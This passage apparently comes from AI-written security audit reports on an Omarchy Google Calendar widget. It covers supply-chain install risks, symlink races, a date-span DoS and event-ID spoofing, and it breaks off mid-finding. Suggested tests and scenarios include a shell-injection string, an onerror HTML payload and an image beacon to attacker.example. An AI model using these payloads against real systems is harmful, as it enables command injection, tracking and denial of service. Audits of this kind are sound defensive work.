- **Impact:** Memory spike of ~16.06 MB per call before kill — not exploitable beyond local DoS. Mitigation (selector + `proc.kill()` + `sel.close()` + `stream.close()`) is correct and prevents fd leak.
- **Existing mitigation:** Byte cap, timeout 120 s, `proc.kill()` on exception, `sel.close()` in `finally`.
- **Recommended fix:** Check `len(buf) + len(chunk) > MAX_RESPONSE_BYTES` **before** `buf.extend(chunk)` to avoid the 64 KiB overshoot; already minimal.
- **Breaking:** No.

---

### S-14: Missing pin on `google-cloud-cli` AUR package version

- Consolidated with S-04. No version pin on `yay -S google-cloud-cli`; latest AUR `PKGBUILD` is installed. Attacker who compromises AUR can push malicious PKGBUILD that builds and installs with `sudo`.

---

## 4. EXECUTIVE SECURITY ASSESSMENT

**Overall posture: MODERATE.** The codebase shows **high security awareness** — the strongest in-class among recent Omarchy plugins reviewed: byte-capped reads, atomic `0600` writes, `PlainText` rendering, scheme allowlist, deduped/sorted/capped state, timeouts, and correct `shellQuote`. The residual risk is concentrated in **supply-chain/trust-boundary gaps**, not in classical injection.

**Critical/High risks:** (1) binary substitution via `config.json:gwsPath` (S-05, 5-min persistence), (2) unauthenticated `npm`/`cargo`/`yay` fetches that run arbitrary code as user then `sudo` (S-04). Both require either network compromise or one-time file-write, but give **full user → root** chain.

**Medium risks:** predictable tmp symlink races (S-03) and unquoted `ExecStart`/`config.json` heredoc (S-01, S-02) — local DoS/file-overwrite with realistic preconditions (same-UID malware, or path with spaces).

**Low/Info:** phishing via shared-calendar `https://` links (S-07), unbounded error message (S-08), and `~/.config/gws` permission assumptions. No direct remote RCE found in the Google→QML path; no shell injection via QML→Python→gws path (array exec + JSON dumps + `shellQuote` are correct).

**Bottom line:** For a Calendar/Tasks widget the data-flow hardening is **above average**. The two high-severity items are **deployment-time** (install) not **runtime**; a user who installs dependencies manually and validates `gws` bypasses the worst of it. The timer persistence via writable `ExecStart` target (S-09) is inherent to `--user` plugins and should be hardened with systemd sandboxing.

---

## 5. CRITICAL / HIGH FINDINGS (summary)

| ID | Title | Severity | Confidence |
|----|-------|----------|------------|
| S-05 | `gwsPath` from `config.json` trusted without binary validation → persistent code exec every 5 min | **High** | High |
| S-04 | Automatic `npm`/`cargo --git`/`yay AUR` fetch without integrity verification → supply-chain RCE → `sudo pacman` → root | **High** | High |
| S-03 | Predictable tmp paths + symlink-race (`O_TRUNC` without `O_EXCL`/`O_NOFOLLOW`) → arbitrary user-file overwrite | **Medium** | High |
| S-01 | Unsanitized heredoc → `config.json` injection via `gwsPath` (and `TIMEZONE`) | **Medium** | High |
| S-02 | Unquoted `ExecStart` → timer DoS / unit injection via path with spaces/newline | **Medium** | High |
| S-09 | Writable `ExecStart` target + user-writable unit → timer persistence after one-time write | **Medium** | High |

---

## 6. MEDIUM FINDINGS (summary)

- S-01, S-02, S-03, S-09 above are Medium. No additional Medium items beyond those; DoS via pagination/byte caps already bounded.

---

## 7. LOW / INFORMATIONAL FINDINGS

| ID | Title | Severity |
|----|-------|----------|
| S-07 | Organizer-controlled `conferenceData.uri` (`https:`) → phishing via allowed click | **Low** |
| S-08 | `syncStatus.message` unbounded (no 512-char clip) → UI overflow / large `state.json` | **Low** |
| S-13 | `_run_capped` 64 KiB overshoot before kill — negligible | **Low** |
| S-12 | `shellQuote` + array `Popen` — correctly handled (**strength**, do not change) | **Info** |
| S-11 | `--purge-credentials` local delete without enforced online revoke | **Info** |

---

## 8. SECURITY STRENGTHS ALREADY PRESENT (do not regress)

1. **Shell safety:** `Panel.qml:187` `shellQuote` is correct POSIX; `gws_adapter.py:100` `Popen([exe, ...], ...)` array form + `json.dumps` for `--params`/`--json` → **no shell injection** on the QML→Python→gws path. `ClockStateFile.qml:38-41` correctly passes `root.path` as `"$1"` inside `sh -c` with quoted `"$(( $2 + 1 ))"`.
2. **File hygiene:** `sync.py:169-195` `atomic_write` sets parent `0700`/`file 0600`, `os.fchmod 0600`, `fsync`, `tmp.replace` (atomic), unique `pid.counter` suffix. `sync/config.py:151` same. `Model.js:455` `MAX_STATE_CHARS 4MiB` mirrored by `sync.py:47` `MAX_STATE_BYTES 4MiB`; bounded reads in `sync.py:207` `f.read(MAX+1)` and `config.py:87` `f.read(MAX_CONFIG_BYTES+1)`.
3. **Output caps:** `gws_adapter.py:35-37` `MAX_RESPONSE_BYTES 16MiB`, `MAX_LIST_PAGES 20`, `MAX_LIST_ITEMS 5000` → pagination cannot exhaust memory. `schema.py:28-34` per-field caps `MAX_TITLE 512`, `MAX_NOTES 4096`, `MAX_URL 2048` + `MAX_STATE_EVENTS/TASKS 10000`.
4. **UI injection:** Every Google-controlled string rendered with `textFormat: Text.PlainText` (`ClockEventRow.qml:53-54`, `ClockTaskRow.qml:43`, `ClockEventsCard.qml:101`, `ClockWeekView.qml:160`, etc.). `Panel.qml:244` `allowedUrlSchemes` allowlist + `Qt.openUrlExternally` (no shell).
5. **Validation:** `sync/config.py:114-140` `validate_config` checks `timezone` via `ZoneInfo`, caps `pastDays/futureDays/syncIntervalMin`; `sync/schema.py:94-142` `validate_state` enforces `version`, `source`, `calendars/events/tasks` shapes; `mutate.py:77-94` `_validate_args` rejects malformed `date`/`HH:MM`/`due` before any `gws` call.
6. **Auth handling:** `sync.py:297-300` probes `gws auth status` and raises `AuthError` on `auth_method none`; `gws_adapter.py:188-210` maps exit `2`/`authError`/`401` to `AuthError`; failures preserve last-good `state.json` via `_preserve_or_emit_failure` (never overwrites good state with invalid doc).
7. **Dedup/sort/caps ordering:** `sync.py:395-396` `dedupe → sort → _cap` + `fit_state_bytes` drops latest window entries first — prevents duplicate-ID bloat and keeps earliest window data.
8. **Primary-calendar fallback avoids holiday calendar:** `Panel.qml:190-196` explicitly excludes `id` containing `#` (holiday calendars use `#holiday@group.v.calendar.google.com`).

---

## 9. ATTACK-SURFACE MAP

| Surface | Entry point | Bound checked? | AuthZ | Next hop |
|---------|-------------|----------------|-------|----------|
| `yay -S google-cloud-cli` (AUR) | `setup.sh:176` PKGBUILD `build()` | ❌ No hash/sig | sudo | Root install |
| `npm install -g @googleworkspace/cli` | `setup.sh:136` tarball | ❌ Pinned version only | user | `~/.npm` + `gws` binary |
| `cargo install --git ... --rev` | `setup.sh:149` git fetch | ⚠️ Rev pinned, no sig | user | `~/.cargo/bin/gws` |
| `gcloud auth` / `gws auth setup/login` | `setup.sh:244-276` browser OAuth | ✅ `calendar,tasks` scoped | Google OAuth | `~/.config/gws` tokens |
| `gws` JSON output | `gws_adapter.py:_run_capped` | ✅ 16 MiB cap, timeout, JSON parse | — | `sync.py:normalize_*` (512/4096/2048 caps) |
| `state.json` on disk | `sync.py:atomic_write` (0700/0600) | ✅ 4 MiB cap, atomic | owner only | `ClockStateFile.qml:head -c` + `Model.js:parseState` (4 MiB cap) |
| `config.json` on disk | `sync/config.py:load_config` (64 KiB cap) | ⚠️ No sig | owner only | `sync.py:_find_gws(gwsPath)` (S-05) |
| `shell.json` `parm.clock` entry | `Panel.qml:persistSettings` | ❌ No validation of `hiddenCalendars` values (calendarIds) | owner only | `Model.visibleEventsOn` filter |
| QML form inputs (title/due/date/start/end/location/meet) | `ClockEventForm/TaskForm → mutate.py` | ✅ date/HH:MM validated, title not length-capped | user | `gws_adapter.insert_event` (JSON dumps) |
| `htmlLink`/`meetUrl` click | `Panel.qml:openEventLink` → `Qt.openUrlExternally` | ✅ allowlist `https/http/meet/zoommtg/tel/mailto` + PlainText | user gesture | External browser/app |
| `systemd --user` timer | `setup.sh:373` `ExecStart=python …/sync.py` | ⚠️ Writable target | user | Code exec every 5 m |
| `uninstall.sh --purge-*` | `scripts/uninstall.sh:69` `rm -rf` | ✅ `ask()` confirmation | user → sudo | File deletion |

---

## 10. TOP 10 FIXES RANKED BY RISK REDUCTION

1. **(S-05) Validate `gwsPath` at runtime** — re-run `is_correct_gws` check in `gws_adapter._find_gws` / `sync.py:run_sync`; reject world-writable or non-executable paths. *Risk reduction: eliminates persistent binary substitution.*
2. **(S-04) Remove `--noconfirm` and add integrity checks for `yay`/`npm`/`cargo`** — show PKGBUILD diff, verify `npm` tarball `integrity` via `npm view`, or document manual install as default. *Risk: blocks supply-chain RCE → root.*
3. **(S-03) Replace predictable tmps with `mkstemp`/`O_EXCL|O_NOFOLLOW`** in `config.py:save_config` and `apply_interval.py:_write_timer` (and harden `sync.py` with `O_EXCL`). *Risk: closes arbitrary file overwrite.*
4. **(S-01) JSON-serialize `config.json` writes** — replace heredoc with `python3 -c 'import json; json.dump(...)'` or `jq`. *Risk: closes config injection.*
5. **(S-02) Quote `ExecStart` components** — `printf 'ExecStart=%q %q\n' "$python_bin" "$SYNC_DIR/sync.py"` and escape newline. *Risk: fixes timer DoS on paths with spaces.*
6. **(S-09) Harden the systemd unit** — add `NoNewPrivileges=yes`, `ProtectSystem=strict`, `ReadWritePaths=%h/.local/state/parm.clock`, `PrivateTmp=yes`, `ProtectHome=read-only` (if compatible). *Risk: limits blast radius of writable `sync.py`.*
7. **(S-08) Clip `syncStatus.message`** — `clip(message, 512)` in `sync.py:_preserve_or_emit_failure` and `mutate.py:_fail`. Add `message` length check in `validate_sync_status`. *Risk: prevents UI overflow/large state.*
8. **(S-07) Tighten URL allowlist** — restrict to `https:`/`http:` by default, or add confirmation dialog for `meet:`/`zoommtg:`. *Risk: reduces phishing via shared calendars.*
9. **(General) Set `~/.config/gws` permission check** — on `run_sync`, warn if `~/.config/gws` is group/other-readable (should be `0700`). *Risk: detects token leakage on multi-user hosts.*
10. **(General) Add `state.json` signature / hash** — optionally sign `state.json` with a per-install HMAC so QML can reject externally modified state. Low priority; defense-in-depth.

---

## 11. QUESTIONS REQUIRING MANUAL TESTING

- Does `yay -S google-cloud-cli` PKGBUILD contain `curl | bash` or `install` scripts that write outside the package (test with `yay -G google-cloud-cli && cat PKGBUILD`)?
- What `umask` does the user's `npm` global prefix use (does `npm install -g` create world-writable `gws`)?
- What are the actual permissions of `~/.config/gws` after `gws auth login` (is it `0700`/`0600` or `0755`)?
- Does `bar.run("python3 ... && omarchy-shell -q parm.clock refresh")` use `sh -c` or `exec` directly (run a test with `syncPath` containing `'; id > /tmp/pwned; echo ' ` and verify `shellQuote` blocks it)?
- Can a malicious calendar event with `title` = 1 MB of `A` bypass `MAX_TITLE 512` clipping on the **write** path (create via Google web UI, not via `mutate.py`) and still be stored?
- Does `systemd --user daemon-reload` after `apply_interval.py` correctly apply new `OnUnitActiveSec` without `systemctl --user restart parm.clock-sync.timer` on all systemd versions?
- Is `gws` keyring backend (`keyring`/`secret-service`/`kwallet`) running in the user session at timer fire time, or does `gws auth status` fail headless and mark state `auth` every 5 m?
- Does `Qt.openUrlExternally("meet:evil")` actually dispatch to an OS handler, and can it be abused with `meet://` payload?

---

## 12. SECURITY TESTS TO ADD

```python
# tests/test_security.py (suggested)

def test_config_write_escapes_gws_path(tmp_path):
    """Heredoc JSON injection: gwsPath containing \" must not break JSON."""
    # Write via setup.sh logic then assert json.loads succeeds and gwsPath round-trips
    ...

def test_systemd_execstart_quoted_with_spaces(tmp_path):
    """Plugin path with spaces must produce a valid unit that systemd can parse."""
    ...

def test_tmp_symlink_race_config(tmp_path):
    """Pre-created symlink at config.json.tmp must not cause overwrite of target."""
    # ln -s /tmp/victim config.json.tmp; save_config({"timezone":"UTC"...}); assert /tmp/victim unchanged
    ...

def test_gws_path_binary_substitution(tmp_path):
    """run_sync with gwsPath pointing to attacker binary must be rejected."""
    # cfg = {"gwsPath": "/tmp/evil-gws", ...}; with mock _find_gws; assert GwsNotFound or fallback
    ...

def test_state_message_clipped():
    """syncStatus.message 10k chars must be clipped to <=512 in state.json."""
    # _preserve_or_emit_failure(target, cfg, "error", "A"*10000); assert len(state["syncStatus"]["message"]) <= 512
    ...

def test_url_allowlist_blocks_file_and_javascript():
    """openEventLink must refuse file:, data:, javascript: even if htmlLink contains them."""
    # QML unit test: Model + Panel openEventLink logic
    ...

def test_max_state_bytes_enforced_with_attacker_titles():
    """10000 events with 4096-char notes must still fit under 4 MiB via fit_state_bytes dropping."""
    ...

def test_plaintext_rendering():
    """Event title '<b>bold</b><img onerror=alert(1)>' must be rendered as PlainText (no HTML)."""
    # Snapshot QML Text.textFormat == PlainText
    ...

def test_path_hijack_npm_cargo(tmp_path):
    """setup.sh with PATH containing attacker npm/cargo must not execute it without confirmation."""
    # Mock command_exists to point to attacker bin; assert ask() gate
    ...

def test_load_config_oversized_returns_defaults():
    """64 KiB +1 config file must be rejected, not materialized."""
    ...

def test_gws_adapter_byte_cap():
    """gws that streams 17 MiB must be killed with GwsError kind=limit, not OOM."""
    ...
```

Also add a QML test for `Model.parseState` with `__proto__` payload to assert no prototype pollution.

---

## 13. THINGS THAT SHOULD *NOT* BE CHANGED (secure by design)

- **`Panel.qml:187` `shellQuote`** — correct POSIX single-quote escaping; do not replace with double-quote or `escape()`; the array-form `mutateProc.command` is the safer pattern for user strings, keep it.
- **`ClockStateFile.qml:38-41` `head -c` bounded read** — the single-open `head -c "$(( $2 + 1 ))" -- "$1"` + `2>/dev/null || printf UNREADABLE` + `Model.MAX_STATE_CHARS` + `raw.length > MAX` check is the correct TOCTOU-safe pattern; do not switch to `FileView.text()` (unbounded) or a two-step `stat` then `read`.
- **`textFormat: Text.PlainText` everywhere** — `ClockEventRow`, `ClockTaskRow`, `ClockEventsCard`, etc. deliberately block HTML/RichText injection from Google-controlled `title`/`location`/`notes`; do not change to `AutoText`/`RichText`.
- **`sync.py:169-195` atomic write with `0700`/`0600` + `fsync` + `replace`** — correct privacy and crash-safety; keep it and extend the same pattern to `config.py` (with randomized tmp).
- **`gws_adapter.py:91-147` `_run_capped` selector + byte cap + `proc.kill()` + `sel.close()`/`stream.close()`** — correct resource-bound subprocess handling; keep it.
- **`sync.py:445` last-good preservation** — never overwrites a valid `state.json` with an invalid/error document; keep it.
- **`Panel.qml:244` scheme allowlist + `Qt.openUrlExternally`** — correct vs `bar.run`/`xdg-open` via shell; keep the allowlist and do not add `file:`/`data:`.
- **Field caps in `schema.py:32-34`** and **state caps in `sync.py:39-47`** and **Model.js:455** — the layered size bounds are the primary DoS defense; keep them in sync (character ceiling vs byte ceiling).

---

### Audit closing note

No shell injection, no privilege escalation to root *via the sync/QML code itself*, and no stored XSS were found. The material risks are **pre-execution supply-chain** (`npm`/`cargo`/`AUR` + `sudo`) and **post-write persistence** via `gwsPath`/`ExecStart` trust — both fixable without breaking the user-visible widget. The Google→QML data flow is well-hardened (caps, clips, `PlainText`, allowlist); keep those invariants.


===== GLM-5.3 FLASH =====

Audit complete — all files read, no modifications made. Final report follows.

---

# SECURITY AUDIT — omarchy-google-calendar-clock (parm.clock)

**Scope:** full repo at commit `1026a80` — all QML, `Model.js`, `sync/*.py`, `scripts/*.sh`, `systemd/*`, `manifest.json`, `.gitignore`, README-documented flows. Read-only audit; nothing modified.

---

## Per-Finding Reports

---

### F-01

**ID:** F-01
**Title:** Unbounded multi-day expansion in `Model.eventIndex` → sustained shell DoS / memory exhaustion from a single malicious calendar event
**Severity:** High
**Confidence:** High
**CWE:** CWE-400 (Uncontrolled Resource Consumption), CWE-770
**Affected file:** `Model.js`
**Affected function:** `dayRange()` (Model.js:113–131) called from `eventIndex()` (Model.js:319–334), bound in `Panel.qml:33` (`readonly property var eventIdx: Model.eventIndex(state.events)`)
**Approximate line:** Model.js:126–129 (`while (start <= end) { ... }` — no span cap)

**Attack precondition:** Attacker is an organizer/attendee-with-write on any calendar the victim's Google account has visible (shared work calendar, public "subscribed" calendar, family calendar). The victim syncs it — `filter_calendars` (sync/sync.py:84–91) only drops Google's own `hidden` flag, so every shared calendar is fetched.

**Attacker capability:** Remote (via Google Calendar data only). No local access needed.

**Attack path:**
1. Attacker creates ONE event on the shared calendar: `start.dateTime = 0001-01-01T00:00:00Z`, `end.dateTime = 9999-12-31T23:59:59Z` (timed, or all-day `start.date=0001-01-01`, `end.date=9999-12-31`).
2. `normalize_event` (sync/schema.py:248–321) computes `dateKey ≈ 0001-01-01`, `endDateKey ≈ 9999-12-31`. Nothing rejects the span; `_cap`/`MAX_STATE_EVENTS` bound event *count*, not *span*; one record is ~500 bytes so `fit_state_bytes` passes easily.
3. Every sync writes it into `state.json`; QML rebuilds `eventIdx`.
4. `dayRange()` loops ~3.65M times: allocates a 3.65M-element `out` array, plus `index[key] = []` creates ~3.65M separate JS arrays, plus a push into each.

**Why it is vulnerable:** The span of `(endDateKey − dateKey)` is fully attacker-controlled and never clamped, in a long-lived desktop shell process. `MAX_STATE_BYTES` (sync.py:47), `MAX_STATE_EVENTS` (sync.py:39) and the QML `MAX_STATE_CHARS` cap (Model.js:455) all bound the *document*, not the *materialized index*.

**Concrete exploit scenario:** Attacker shares "Team Calendar" with the victim. Next sync (≤5 min, timer at systemd/parm.clock-sync.timer:6), the QJS engine in Quickshell blocks for seconds building ~3.65M arrays (~0.5–1.5 GB heap), freezing the entire bar/panel — and repeats on **every** subsequent sync/error-triggered state reload (Panel.qml:33 binding re-evaluates on each `stateFile.state` change, i.e., ≥ every 5 minutes). Multiple such events multiply the cost. OOM-kill of the shell is plausible on low-RAM machines.

**Impact:** Sustained denial of service of the whole Omarchy shell (bar, popouts), not just this widget. Availability only — no code execution.

**Existing mitigation:** Item-count caps (`MAX_STATE_EVENTS=10000`), per-field clips, byte ceiling on state.json, 16 MB gws response cap.

**Why the mitigation is insufficient:** All caps bound stored bytes, none bounds `endDateKey − dateKey`. A single ≤500-byte event record defeats every one of them.

**Recommended fix:** Clamp in both layers: in `Model.js dayRange()`, bail out (return `[startIso]`) when `end - start > N days` (e.g., 366); in `sync/schema.py:normalize_event`, clamp `edk ≤ dk + 365d` before emitting. Keep the two caps consistent.

**Would the fix be breaking:** No — legitimate multi-year recurring expansion is not a supported use case for a clock widget; visual behavior changes only for pathological spans.

---

### F-02

**ID:** F-02
**Title:** Privileged package removal/install auto-approved without a dedicated prompt when stdin is not a TTY (or `--yes`), including silent `sudo pacman -Rns`
**Severity:** Medium
**Confidence:** High
**CWE:** CWE-250 (Execution with Unnecessary Privileges) / CWE-862 (Missing Authorization for privileged step)
**Affected files:** `scripts/setup.sh`, `scripts/uninstall.sh`
**Affected functions:** `ask()` (setup.sh:102–115, uninstall.sh:77–88), `install_correct_gws()` (setup.sh:117–155), `ensure_deps()` (setup.sh:159–199), uninstall package purge (uninstall.sh:174–216)
**Approximate lines:** setup.sh:127–131 (`sudo pacman -Rns --noconfirm gws`), setup.sh:176 (`yay -S --needed --noconfirm google-cloud-cli`), uninstall.sh:180/182/194

**Attack precondition:** The plugin's setup/uninstall runs non-interactively (stdin not a tty — e.g., pasted from a dotfile script, CI, a "one-liner" wrapper, `curl … | bash` style invocation, or an install script that pipes stdin) **or** with `--yes`, **and** sudo credentials are cached (`timestamp_timeout` not expired).

**Attacker capability:** No attacker needed — this is a weakened-authorization design that turns an interactive installer into a non-interactive privileged mutator. It is also exploitable as a step in a social-engineering chain ("run this dotfiles bootstrap that also installs the clock plugin").

**Attack path:** `ask()` returns 0 (yes) unconditionally when `[[ ! -t 0 ]]` (setup.sh:110). `install_correct_gws()` then runs `sudo pacman -Rns --noconfirm gws` (setup.sh:129) **without any additional prompt for that specific destructive privileged action** — the outer "Install gws now?" question is the only gate, and it just answered itself. Same for `yay -S --noconfirm` (AUR PKGBUILD executes attacker-influenceable build code, no review prompt) and uninstall's `sudo pacman -Rns --noconfirm google-cloud-cli` / `gws`.

**Why it is vulnerable:** A single blanket consent ("install gws?") silently covers: removing a system package via sudo, executing AUR PKGBUILDs with `--noconfirm`, and global npm installs. Non-interactive execution converts "user reviewed and agreed" into "script agreed on the user's behalf."

**Concrete exploit scenario:** User's dotfiles bootstrap runs `~/.config/omarchy/plugins/parm.clock/scripts/setup.sh < /dev/null` during system provisioning with cached sudo. The wrong `gws` pacman package is removed with sudo, AUR builds run, all without a human seeing a single prompt — no audit trail beyond shell history.

**Impact:** Unattended privileged system mutation; AUR build-code execution without review. Integrity of the system package set.

**Existing mitigation:** Prompts exist; `--dry-run` supported; wrong-gws removal is scoped to a grep-identified package.

**Why the mitigation is insufficient:** The non-tty auto-yes path (setup.sh:110, uninstall.sh:83) plus `--yes` collapses all prompts into implicit consent, and the sudo `pacman -Rns` is not separately gated even interactively.

**Recommended fix:** (1) Remove the `[[ ! -t 0 ]] → return 0` auto-yes for any step that invokes sudo or mutates packages — require explicit `--yes` for those and say so in `--help`; (2) give `pacman -Rns` its own dedicated `ask` naming the exact package and action; (3) drop `--noconfirm` from the removal (keep it only for the AUR *build* prompts if desired, after showing the PKGBUILD).

**Would the fix be breaking:** Behaviorally yes for scripted installs — intentional.

---

### F-03

**ID:** F-03
**Title:** Cross-calendar event-ID shadowing in `dedupe()` lets a secondary (attacker-influenced) calendar spoof or suppress a real event in the UI
**Severity:** Medium
**Confidence:** Medium
**CWE:** CWE-706 (Use of Incorrect Name/Reference), CWE-345 (Insufficient Verification of Data Authenticity)
**Affected file:** `sync/sync.py`
**Affected function:** `dedupe()` (sync/sync.py:101–111), fed by the thread pool in `run_sync()` (sync/sync.py:373–393)
**Approximate line:** sync.py:106–110 (`key = ev.get("id"); if not key or key in seen: continue`)

**Attack precondition:** Attacker controls (or influences) any calendar visible to the victim, and knows or guesses the ID of a victim's event on another calendar. Google event IDs are unique *per calendar*, not globally; instance IDs of recurring events are deterministic (`<baseId>_<YYYYMMDDTHHMMSSZ>`), and IDs may be caller-chosen on insert.

**Attacker capability:** Remote, via calendar data.

**Attack path:** Events from all calendars are pooled and completed in nondeterministic `as_completed` order (sync.py:380). `dedupe` keeps the **first** record seen for a given `id`, regardless of which calendar it came from. If the attacker's calendar is processed first, their event (title, time, location, `meetUrl` under their control) replaces the victim's legitimate same-ID event in `state.json`.

**Why it is vulnerable:** The dedupe key omits `calendarId`, and there is no preference ordering (e.g., primary calendar wins). Which copy survives is a race.

**Concrete exploit scenario:** Victim's recurring event `a1b2c3_20260901T090000Z` says "Server maintenance 09:00". Attacker inserts an event with that exact instance ID on a shared calendar titled "Maintenance cancelled — proceed with deploy". On the next sync, if the attacker's calendar thread completes first, the victim's UI shows the attacker's title/time/location for that day, and the real event is invisible. User acts on the spoofed agenda.

**Impact:** UI-level data spoofing and event suppression. No server-side change (writes use explicit IDs from user action), but a user acting on displayed data can be manipulated.

**Existing mitigation:** `dedupe` exists to remove the same id appearing twice; dot color resolves by `calendarId` so the shown dot would be the attacker's calendar color (a weak tell).

**Why the mitigation is insufficient:** First-wins with random thread order is not a correctness or security policy; the dot color hint is easily missed.

**Recommended fix:** Key dedupe by `(calendarId, id)`; if a global-id dedupe is truly needed, deterministically prefer the event from the `primary` calendar, then lowest calendarId — never thread-completion order.

**Would the fix be breaking:** No.

---

### F-04

**ID:** F-04
**Title:** `gwsPath` is an unvalidated executable sink driving a 5-minute systemd timer (persistence primitive); relative paths resolve against the service CWD
**Severity:** Low
**Confidence:** High
**CWE:** CWE-78 (OS Command Execution via untrusted path setting), CWE-426
**Affected files:** `sync/config.py` (validate_config:133–135), `sync/gws_adapter.py` (`_find_gws`:70–77), `sync/sync.py:285`, generated unit (setup.sh:384)
**Approximate line:** gws_adapter.py:72–73 (`if path_override: return path_override`)

**Attack precondition:** Attacker already has arbitrary write as the user (not root). Reported because it is a *persistence* sink, which the instructions ask us to evaluate as a boundary-adjacent mechanism.

**Attack path:** Any user-level code writes `~/.config/parm.clock/config.json` with `"gwsPath": "./.cache/x"` (relative) or any absolute path. `validate_config` only checks "non-empty string". `sync.py` runs every 5 minutes from the systemd user unit; relative paths resolve against the unit's default CWD (`$HOME`), so `$HOME/.cache/x` executes on every timer tick. The binary is never re-verified against what setup.sh installed (no hash, no `is_correct_gws` at runtime).

**Why it is vulnerable:** Config is both user-writable and the sole authorization for which binary the timer executes; no absolute-path check, no ownership check, no pinning.

**Concrete exploit scenario:** Malicious postinstall script (of any other npm package) writes the config; it now survives package removal and masquerades as the calendar sync in `systemctl --user` listings.

**Impact:** Durable, stealthy command execution channel for an already-compromised user account.

**Existing mitigation:** config.json is 0600 in a 0700 dir (config.py:151–160); file can only be modified by the user or root.

**Why the mitigation is insufficient:** The threat model for persistence is precisely "code running as the user," which the permission model does not stop.

**Recommended fix:** In `validate_config`, require `gwsPath` to be absolute, existing, executable, and owned by the user (reject relative); add `WorkingDirectory=/` (or `%h` explicitly documented) and quote `ExecStart` paths in the generated unit (see F-07).

**Would the fix be breaking:** Only for exotic setups that deliberately use a relative gwsPath — unlikely.

---

### F-05

**ID:** F-05
**Title:** Attacker-controlled calendar names rendered through host `Toggle` component with unknown `textFormat` — potential rich-text injection / remote-image beacon
**Severity:** Low
**Confidence:** Low
**CWE:** CWE-79 (QML rich-text variant), CWE-200
**Affected file:** `ClockSettingsSection.qml`
**Affected function:** `Repeater { model: section.calendars } → Toggle { label: modelData.name || modelData.id }` (ClockSettingsSection.qml:60–71)
**Approximate line:** ClockSettingsSection.qml:65

**Attack precondition:** Attacker names a shared calendar containing markup (e.g., `<img src="http://attacker/pixel">`); victim opens ⚙ Settings. Whether this is exploitable depends on the **host** `qs.Ui Toggle` component (not in this repo): if its internal `Text` uses the default `AutoText`, Qt rich text is enabled.

**Attack path:** This repo's own `Text` elements consistently set `textFormat: Text.PlainText` (strength), but `Toggle`/`Dropdown` are Omarchy shell components outside the audit boundary. A remote `<img>` would trigger an HTTP request to the attacker when the settings panel opens (IP/time leak); HTML could also distort the UI.

**Why it is vulnerable (potentially):** Trusting a host component's default for attacker-controlled strings.

**Concrete exploit scenario:** `<img src="https://attacker.example/c?cal=victim">` as calendar summary → settings panel open → beacon to attacker.

**Impact:** Minor information disclosure / UI distortion. Not code execution (QML `Text` does not run scripts).

**Existing mitigation:** None in this file — the value is passed through raw.

**Why the mitigation is insufficient:** Reliance on host-component defaults is unverifiable from this repo.

**Recommended fix:** In the Repeater, pass a pre-sanitized label (strip `<`, or force `modelData.name.replace(/</g, "&lt;")` is wrong for PlainText — better: enforce PlainText by verifying/overriding the host Toggle's textFormat, or file the requirement upstream). At minimum, add a manual test with a markup calendar name.

**Would the fix be breaking:** No.

---

### F-06

**ID:** F-06
**Title:** `runMutate` logs full argument vector (including user-typed event titles) via `console.warn`
**Severity:** Low
**Confidence:** High
**CWE:** CWE-532 (Insertion of Sensitive Information into Log File)
**Affected file:** `Panel.qml`
**Affected function:** `runMutate()` (Panel.qml:216–222)
**Approximate line:** Panel.qml:217 — `console.warn("parm.clock runMutate blocked, already running", JSON.stringify(args))`

**Attack precondition:** None (no attacker needed) — but a shared-calendar participant or shoulder-surfer/serilogger can benefit; also applies to any future caller passing sensitive text.

**Attack path:** Rapid double-submit → blocked call logs `["event-add","--calendar",…,"--title","<user text>"]` to the Quickshell log/journal.

**Why it is vulnerable:** User and calendar content has no business in persistent logs; journal may be readable by `adm`/`wheel` group members on some setups.

**Impact:** Minor disclosure of personal calendar input into logs.

**Existing mitigation:** Only fires on the blocked path.

**Why the mitigation is insufficient:** Still a leak channel; log rotation keeps it around.

**Recommended fix:** Log only `args[0]` (the subcommand) and arg count.

**Would the fix be breaking:** No.

---

### F-07

**ID:** F-07
**Title:** Generated systemd `ExecStart` uses unquoted absolute paths — plugin directories containing spaces/metacharacters produce broken or misparsed units
**Severity:** Low
**Confidence:** High
**CWE:** CWE-78 (improper quoting in unit file)
**Affected file:** `scripts/setup.sh`
**Affected function:** `install_systemd()` heredoc
**Approximate line:** setup.sh:384 — `ExecStart=$python_bin $SYNC_DIR/sync.py`

**Attack precondition:** User clones the plugin into a path containing a space (README Option B explicitly invites arbitrary clone paths: `git clone … ~/.config/omarchy/plugins/parm.clock`, but nothing prevents `~/plugins/my clock/`). No adversarial precondition required beyond a directory name; a same-user attacker could also pre-place an executable matching the first split word.

**Attack path:** systemd splits ExecStart on unquoted whitespace → `/home/u/my` becomes the interpreter-ish first word (must be an existing executable; if the user also owns `/home/u/my`, that binary runs every 5 minutes instead of sync.py — self-controlled path, so mainly a correctness bug with a minor masquerading angle).

**Why it is vulnerable:** Paths interpolated into a systemd unit without quoting — same class of bug as shell injection, with systemd's parser as the consumer.

**Impact:** Timer silently fails or executes the wrong file; no privilege crossing (user unit, user-owned paths).

**Existing mitigation:** README suggests the standard path; setup.sh computes absolute paths.

**Why the mitigation is insufficient:** Nothing validates or quotes the path for systemd's grammar (double-quote escaping required for spaces).

**Recommended fix:** Emit `ExecStart="$python_bin" "$SYNC_DIR/sync.py"` with `"` escaping, or reject install paths containing whitespace in setup.sh.

**Would the fix be breaking:** No.

---

### F-08

**ID:** F-08
**Title:** `uninstall.sh --purge-credentials` runs `gcloud auth revoke --all` — revokes every gcloud credential on the machine, far beyond this plugin's scope
**Severity:** Low
**Confidence:** High
**CWE:** CWE-284 (Improper Access Control — over-broad destructive operation)
**Affected file:** `scripts/uninstall.sh`
**Affected function:** credentials purge block
**Approximate line:** uninstall.sh:162

**Attack precondition:** User runs `--purge-credentials` (or `--purge-all`) and confirms the prompt (or hits the F-02 non-tty auto-yes path).

**Attack path:** `gcloud auth revoke --all` invalidates ADC and all `gcloud auth login` sessions for *other* projects/tools on the machine (terraform, docker-credential-gcloud, other OAuth clients), breaking them.

**Why it is vulnerable:** A plugin uninstaller should scope itself to the credentials it created (the gws client/token), not the global gcloud state. The script even acknowledges gcloud was only an installer dependency.

**Impact:** Destructive side effect on unrelated credentials; user productivity loss; possible silent breakage of other automation.

**Existing mitigation:** Separate `ask()` prompt naming the command.

**Why the mitigation is insufficient:** The prompt doesn't communicate the blast radius ("revokes ALL gcloud credentials for all other tools on this machine").

**Recommended fix:** Drop the `--all` (revoke only if a `parm.clock`-related account can be identified, or just print instructions), or reword the prompt to state the machine-wide effect explicitly.

**Would the fix be breaking:** No (behavior becomes narrower/safer).

---

### F-09

**ID:** F-09
